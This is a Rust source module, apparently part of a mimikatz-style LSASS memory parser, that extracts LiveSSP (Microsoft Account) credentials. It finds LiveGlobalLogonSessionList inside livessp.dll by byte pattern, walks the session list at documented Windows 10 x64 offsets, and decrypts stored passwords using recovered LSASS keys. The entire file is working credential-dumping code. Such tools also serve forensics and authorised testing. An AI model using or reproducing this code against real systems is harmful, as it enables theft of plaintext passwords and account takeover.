use crate::error::Result;
use crate::lsass::crypto::CryptoKeys;
use crate::lsass::patterns;
use crate::lsass::types::LiveSspCredential;
use crate::memory::VirtualMemory;
use crate::pe::parser::PeHeaders;

/// KIWI_LIVESSP_LIST_ENTRY offsets (Windows 10 x64):
///   +0x00: Flink
///   +0x08: Blink
///   +0x10..+0x34: unk0-unk4 (PVOID fields)
///   +0x38: LUID (8 bytes)
///   +0x40: unk5 (PTR)
///   +0x48: unk6 (PTR)
///   +0x50: suppCreds (PVOID -> KIWI_LIVESSP_PRIMARY_CREDENTIAL)
///
/// KIWI_LIVESSP_PRIMARY_CREDENTIAL:
///   +0x00: isSupp_or_isNtlm (ULONG + 4 pad)
///   +0x08: unknown0 (PVOID)
///   +0x10: credentials (KIWI_GENERIC_PRIMARY_CREDENTIAL):
///     +0x10+0x00: UserName (UNICODE_STRING)
///     +0x10+0x10: DomainName (UNICODE_STRING)
///     +0x10+0x20: Password (UNICODE_STRING, encrypted)
const OFFSET_FLINK: u64 = 0x00;
const OFFSET_LUID: u64 = 0x38;
const OFFSET_SUPP_CREDS: u64 = 0x50;

const SUPP_USERNAME: u64 = 0x10;
const SUPP_DOMAIN: u64 = 0x20;
const SUPP_PASSWORD: u64 = 0x30;

/// Extract LiveSSP credentials from livessp.dll.
///
/// LiveSSP stores Microsoft Account credentials. The DLL may not be loaded
/// on systems that don't use Microsoft Accounts.
pub fn extract_livessp_credentials(
    vmem: &impl VirtualMemory,
    livessp_base: u64,
    _livessp_size: u32,
    keys: &CryptoKeys,
) -> Result<Vec<(u64, LiveSspCredential)>> {
    let pe = PeHeaders::parse_from_memory(vmem, livessp_base)?;
    let mut results = Vec::new();

    let text = match pe.find_section(".text") {
        Some(s) => s,
        None => return Ok(results),
    };

    let text_base = livessp_base + text.virtual_address as u64;

    let (pattern_addr, _) = match patterns::find_pattern(
        vmem,
        text_base,
        text.virtual_size,
        patterns::LIVESSP_LOGON_SESSION_PATTERNS,
        "LiveGlobalLogonSessionList",
    ) {
        Ok(r) => r,
        Err(e) => {
            log::info!("Could not find LiveSSP pattern: {}", e);
            return Ok(results);
        }
    };

    // Search nearby for LEA instruction referencing LiveGlobalLogonSessionList
    let list_addr = patterns::find_list_via_lea(vmem, pattern_addr, "LiveGlobalLogonSessionList")?;
    log::info!("LiveSSP LiveGlobalLogonSessionList at 0x{:x}", list_addr);

    // Walk the doubly-linked list
    let head_flink = vmem.read_virt_u64(list_addr)?;
    if head_flink == 0 || head_flink == list_addr {
        log::info!("LiveSSP: session list is empty");
        return Ok(results);
    }

    let mut current = head_flink;
    let mut visited = std::collections::HashSet::new();

    loop {
        if current == list_addr || visited.contains(&current) || current == 0 {
            break;
        }
        visited.insert(current);

        let luid = vmem.read_virt_u64(current + OFFSET_LUID).unwrap_or(0);
        let supp_ptr = vmem.read_virt_u64(current + OFFSET_SUPP_CREDS).unwrap_or(0);

        if supp_ptr > 0x10000 && (supp_ptr >> 48) == 0 {
            let username = vmem
                .read_win_unicode_string(supp_ptr + SUPP_USERNAME)
                .unwrap_or_default();
            let domain = vmem
                .read_win_unicode_string(supp_ptr + SUPP_DOMAIN)
                .unwrap_or_default();

            if !username.is_empty() {
                let password = crate::lsass::crypto::decrypt_unicode_string_password(
                    vmem,
                    supp_ptr + SUPP_PASSWORD,
                    keys,
                );

                log::debug!(
                    "LiveSSP: LUID=0x{:x} user={} domain={} pwd_len={}",
                    luid,
                    username,
                    domain,
                    password.len()
                );
                results.push((
                    luid,
                    LiveSspCredential {
                        username,
                        domain,
                        password,
                    },
                ));
            }
        }

        current = match vmem.read_virt_u64(current + OFFSET_FLINK) {
            Ok(f) => f,
            Err(_) => break,
        };
    }

    let with_passwords = results
        .iter()
        .filter(|(_, c)| !c.password.is_empty())
        .count();
    log::info!(
        "LiveSSP: found {} entries ({} with passwords)",
        results.len(),
        with_passwords
    );

    Ok(results)
}
